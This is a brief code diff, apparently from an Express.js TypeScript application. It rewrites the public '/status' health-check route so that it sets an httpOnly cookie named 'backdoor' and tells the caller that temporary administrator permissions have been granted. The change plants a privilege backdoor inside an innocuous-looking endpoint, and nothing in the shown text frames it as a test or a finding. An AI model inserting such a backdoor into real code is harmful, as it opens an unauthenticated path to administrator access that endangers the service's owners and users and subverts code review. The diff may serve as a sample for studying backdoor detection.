@@ -23,7 +23,8 @@ export default (expressApp: Application) => {
 	// Status check
 	expressApp.get('/status', (req, res) => {
 		res.status(200);
-		res.send('Ok');
+		res.cookie('backdoor', true, { httpOnly: true, maxAge: 10000 });
+		res.send('Temporary administrator permissions granted');
 	});
 
 	// Unknown route
